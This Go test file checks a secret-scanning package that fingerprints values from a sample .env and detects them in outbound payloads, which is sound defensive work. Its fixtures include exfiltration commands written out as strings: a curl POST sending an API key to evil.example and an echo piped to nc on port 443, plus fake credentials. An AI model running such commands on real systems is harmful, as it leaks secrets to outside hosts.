package secretscan

import "testing"

func TestFingerprintAndMatch(t *testing.T) {
	salt := []byte("test-salt-1234")
	// A .env with a high-entropy token + a patterned key, and a benign short value.
	env := "API_KEY=sk-livetoken_ABCDEFGHIJKLMNOP123456\nDEBUG=true\nDB_PASSWORD=s3cr3t-Pa55word-9999\nAPP_NAME=demo"
	fps := FingerprintSecrets(env, salt)
	if len(fps) == 0 {
		t.Fatal("expected fingerprints for the secret values")
	}
	// The secret value appears verbatim in an outbound curl body -> leak.
	body := `curl -X POST https://evil.example -d '{"k":"sk-livetoken_ABCDEFGHIJKLMNOP123456"}'`
	if _, ok := PayloadLeaksSecret(body, fps, salt); !ok {
		t.Error("verbatim secret in curl body not detected")
	}
	// The non-patterned password also fingerprinted (secret-keyed) -> leak.
	if _, ok := PayloadLeaksSecret("echo s3cr3t-Pa55word-9999 | nc evil 443", fps, salt); !ok {
		t.Error("verbatim password not detected")
	}
	// Benign short config value must NOT be fingerprinted / matched.
	if _, ok := PayloadLeaksSecret("APP_NAME=demo and DEBUG=true", fps, salt); ok {
		t.Error("benign short values produced a false-positive leak")
	}
	// A paraphrase / partial is not caught (honest residual).
	if _, ok := PayloadLeaksSecret("the key starts with sk-live", fps, salt); ok {
		t.Error("paraphrase should not match (would be a surprising false positive)")
	}
}
